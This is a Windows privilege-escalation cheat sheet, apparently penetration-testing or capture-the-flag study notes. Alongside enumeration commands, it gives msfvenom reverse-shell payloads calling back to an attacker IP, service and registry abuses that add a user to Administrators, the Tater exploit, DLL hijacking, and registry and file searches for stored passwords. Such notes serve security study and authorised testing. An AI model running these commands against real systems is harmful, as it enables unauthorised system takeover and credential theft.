# Windows Privilege Escalation

0. [System Enumeration](#system-enumeration)
1. [User Enumeration](#user-enumeration)
2. [Network Enumeration](#network-enumeration)
3. [Password Hunting](#password-hunting)
4. [AV Enumeration](#av-enumeration)
5. [Automated Tools](#automated-tools)
6. [Additional Sources](#additional-sources)

### System Enumeration

**System Info**

The command `systeminfo` can be used to learn information about the system. It can also be filtered to show specific information like OS Name, OS Version, and System Type. This can be useful to know which exploits might work.

```
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
`````

**Installed Patches**

It is sometimes possible to check what patches have been installed. It can also be filtered to only show specific headings (this also prints cleaner)

```
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**Kernel Exploits**

Try running either `winPEAS` or `Windows Exploit Suggester` to find exploits that can be used on this system.

**Drives**

The `wmic` command can also be used to check the drives on the machine

```
wmic logicaldisk get Caption,Description,ProviderName
```

**Windows Subsystem for Linux**

The `wsl` command may not work but the executable can be searched for

```
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
```

If located you can either use `wsl` command if it works or the full path to run commands. If `wsl` is installed as `root` we can create a bind or reverse shell. 

```
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

**Autorun**

Using a tool from SysInternals we can see which applications are using Autorun

**NOTE:** This needs an RDP connection

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

If any applications have Autorun enabled, we can use another tool from SysInternals to check the access level for the application.

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

We can create a reverse shell with the name `program.exe` to potentially exploit the other system.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.54.185 LPORT=9001 -f exe -o program.exe
```

**AlwaysInstallElevated**

Use these commands to see if the "AlwaysInstallElevated" value is set to 1.

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows Installer\AlwaysInstallElevated
```

If it is then we can create `.msi` reverse shell to escalated privileges.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f msi -o setup.msi
```

**Startup Applications**

Using the command `icacls` we can see if we have access to modify the startup applications. If we see an `F` it means we have full access to the directory.

```
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Create a malicious executable and place it in the Startup folder. Log in as the Administrator to simulate someone else logging in to execute the malicious executable.

**DLL Hijacking**

Windows programs use DLLs to run correctly and will search for them on launch. If these DLLs do not exist then it is possible to escalate privileges by placing a malicious DLL where the application is looking. 

`PowerUp` is useful to find potential DLLs to hijack.

Usually, we write the malicious DLL using `Write-HijackDll` function of PowerUp and restart the program. When the program starts it loads the malicious DLL and executes our code with higher privilege.

```
Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
```

**Unquoted Service Path**

Check the `unquotedsvc` and if the `BINARY_PATH_NAME` field does not have quotations around it, it can be exploited.

```
sc qc unquotedsvc
```

We can create a malicious executable and name it as one of the path names.

```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

Place the file in the unquoted path folder, then start the `unquotedsvc` to exploit.

```
sc start unquotedsvc
```

**Program Files**

Check the installed applications. If there are any that we don't know of make sure to research them.

### User Enumeration

**Current User**

Check the current user with the `whoami` command

```
whoami
```

**Current Privileges**

Check the current privileges by adding `/priv` to the above command

```
whoami /priv
```

If any of the following tokens appear as enabled they can potentially be exploited:
- `SeAssignPrimaryToken`
- `SeBackup`
- `SeCreateToken`
- `SeDebug`
- `SeLoadDriver`
- `SeRestore`
- `SeTakeOwnership`
- `SeTcb`

**RunAs**

Look for stored credentials that we can use

```
cmdkey /list
```

If stored credentials are returned for an Administrator we can use them to run commands with higher privileges.

For example, create a reverse shell payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Transfer this to the target machine and run the following command to create a reverse shell connection to the attack machine.

```
runas /savecred /user:WORKGROUP\User "C:\Users\user\Desktop\shell.exe"
```

**Groups**

Check which groups our current user belongs to

```
whoami /groups
```

Check which groups are on this system. We can add the group name to see which users belong to it

```
net localgroup
net localgroup Administrators
```

**Other Users**

Check what other users exist on this machine. Add the username to see more information on that user

```
net user
net user Administrator
```

**File Permissions**

Check the file permissions on different files to see if you can acces them with some modification, e.g. flags. You can use `icacls` to check permissions and grant permissions if allowed. We are looking for an `F` in the output.

```
icacls root.txt
icacls root.txt /grant <Username>:F
```

**Executable Files**

Running `PowerUp` will list executables running as a service. We can check our access level using a tool from SysInternals.

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

If it returns `FILE_ALL_ACCESS` then we can replace this executable with a malicious payload and restart the service to execute.

```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

**Binary Path**

We can use a tool from SysInternals to check what access we have for `daclsvc`

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

If our user has the “SERVICE_CHANGE_CONFIG” permission we can modify the `binpath` and add our user

```
sc config daclsvc binpath= "net localgroup administrators user /add"
sc start daclsvc
net localgroup administrators
```

**Hot Potato**

If the machine is vulnerable to the Hot Potato exploit, we can move the powershell script to the target machine and use it to add our user to the `Administrators` group.

```
powershell.exe -nop -ep bypass
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
net localgroup administrators
```

### Network Enumeration

**Network Connections**

Check the network information

```
ipconfig
ipconfig /all
```

Check the ARP table for other IPs with

```
arp -a
```

Check the route that devices are communicating

```
route print
```

**Active Connections**

Check all of the active connections to see if we can exploit another connection

```
netstat -ano
```

### Password Hunting

**Filenames**

Search for filenames with password in them

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```

**Configuration Files**

Search through configuration files containing the word pass

```
dir /s *pass* == *cred* == *vnc* == *.config*
```

**Common Files**

Check if any of these common files exist on the target machine

```
dir C:\sysprep.inf
dir C:\sysprep\sysprep.xml
dir C:\unattend.xml
dir %WINDIR%\Panther\Unattend\Unattended.xml
dir %WINDIR%\Panther\Unattended.xml
dir C:\*vnc.ini /s /b
dir C:\*ultravnc.ini /s /b
dir C:\ /s /b | findstr /si *vnc.ini
```

**Registry**

Check VNC for passwords

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

Check Windows autologin for passwords

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

Check SNMP Parameters for passwords

```
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

Check Putty for passwords

```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

Check Registry for passwords

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### AV Enumeration

**Service Control**

We can query applications on the machine using Service Control

```
sc query windefend
```

To query all services on the system run the following command

```
c:\>sc queryex type= service
```

**Firewall**

View information about the firewall and the configuration

```
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

### Automated Tools

**winPEAS**

<https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS>

**Seatbelt**

<https://github.com/GhostPack/Seatbelt>

**Watson**

<https://github.com/rasta-mouse/Watson>

**SharpUp**

<https://github.com/GhostPack/SharpUp>

**Sherlock**

<https://github.com/rasta-mouse/Sherlock>

**PowerUp**

<https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>

**JAWS**

<https://github.com/411Hall/JAWS>

**Windows Exploit Suggester**

<https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

### Additional Sources

<https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration>

<https://book.hacktricks.xyz/generic-methodologies-and-resources/shells>

<https://github.com/gtworek/Priv2Admin>

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>

<https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842>

<https://steflan-security.com/category/guides/privilegeescalation/>

<https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html>
